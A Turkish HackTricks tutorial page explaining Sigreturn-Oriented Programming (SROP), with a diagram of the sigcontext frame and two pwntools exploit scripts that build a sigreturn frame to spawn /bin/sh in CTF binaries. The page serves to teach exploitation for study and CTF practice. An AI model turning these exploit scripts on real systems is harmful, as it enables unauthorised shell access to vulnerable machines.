# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

**`Sigreturn`,** genellikle bir sinyal işleyicisi işlemini tamamladıktan sonra temizlik yapmak için kullanılan özel bir **sistem çağrısıdır**. Sinyaller, genellikle olağanüstü bir durumun meydana geldiğini belirtmek için işletim sistemi tarafından bir programa gönderilen kesintilerdir. Bir program bir sinyal aldığında, mevcut çalışmasını geçici olarak durdurur ve sinyali bir **sinyal işleyicisi** ile işlemek üzere tasarlanmış özel bir işlevle ele alır.

Sinyal işleyicisi işini bitirdikten sonra, programın **önceki durumuna geri dönmesi** gerekir, sanki hiçbir şey olmamış gibi. İşte burada **`sigreturn`** devreye girer. Programı, sinyal işleyicisinden **geri dönmeye** ve sinyal işleyicisi tarafından kullanılan **yığın çerçevesini** (işlev çağrılarını ve yerel değişkenleri depolayan bellek bölümü) temizleyerek programın durumunu geri yüklemesine yardımcı olur.

İlginç olan kısım, **`sigreturn`**'un programın durumunu nasıl geri yüklediğidir: bunu yaparak **CPU'nun tüm kayıt değerlerini yığında depolar.** Sinyal artık engellenmediğinde, **`sigreturn` bu değerleri yığından çıkarır**, CPU'nun kayıt değerlerini etkili bir şekilde sinyalin ele alınmadan önceki durumuna sıfırlar. Bu, mevcut yığının en üst kısmına işaret eden yığın işaretçisi kaydını (RSP) de içerir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** sistem çağrısını çağırarak ve **yığında yüklemek istediğimiz kayıt değerlerini ekleyerek** tüm kayıt değerlerini **kontrol etmek** ve bu nedenle örneğin `execve` sistem çağrısını `/bin/sh` ile **çağırmak mümkündür**.
{% endhint %}

Dikkat edin, bu, diğer Ret2syscall'ları çağırmak için parametreleri kontrol etmeyi çok daha kolay hale getiren bir **Ret2syscall türü** olacaktır:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Merak ediyorsanız, bu, daha sonra değerleri kurtarmak için yığında depolanan **sigcontext yapısı**dır (şemaya [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html) bakın):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir açıklama için ayrıca şuraya bakabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Örnek

Signeturn çağrısının ROP aracılığıyla oluşturulduğu bir örneği [**burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), burada rxa'ya `0xf` değerini yerleştiriyor, ancak bu oradan gelen son saldırıdır:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Ayrıca, binary zaten `sigreturn` çağrısını yapıyordu, bu nedenle bir **ROP** ile oluşturulmasına gerek yoktu. [**buradan exploit'i kontrol edin**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Diğer Örnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derleme ikili dosyası. Yığına bir [**ret2syscall**](rop-syscall-execv.md) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla okunabilir ve bayrak, derleme ikilisinin belleğinde bulunur.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derleme ikili dosyası. Yığına bir [**ret2syscall**](rop-syscall-execv.md) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla (derleme ikilisinde `/bin/sh` dizesi bulunmaktadır).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bit, relro yok, canary yok, nx, pie yok. `gets` işlevini kötüye kullanarak basit bir tampon taşması, **`ret2syscall`** gerçekleştiren araç eksikliği ile gerçekleştirilir. ROP zinciri, `/bin/sh`'yi `.bss`'ye yazmak için tekrar gets çağırarak yazar, **`alarm`** işlevini kullanarak eax'ı `0xf` olarak ayarlar ve bir **SROP** çağırmak ve bir kabuk çalıştırmak için kullanır.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bit derleme programı, relro yok, canary yok, nx, pie yok. Akış, yığında yazma, birkaç kaydı kontrol etme ve bir sistem çağrısı yapma ve ardından `exit` çağırma izni verir. Seçilen sistem çağrısı, registreleri ayarlayacak bir `sigreturn`'dur ve bir önceki sistem çağrısı talimatını çağırmak ve `memprotect`'i çalıştırmak için `eip`'yi ayarlayacaktır, böylece derleme alanını `rwx` olarak ayarlar ve ESP'yi derleme alanına ayarlar. Akışı takip ederek, program ESP'yi tekrar okumak için çağırır, ancak bu durumda ESP bir sonraki talimatı işaret edeceğinden, bir kabuk kodu geçirerek onu bir sonraki talimata yazacak ve çalıştıracaktır.
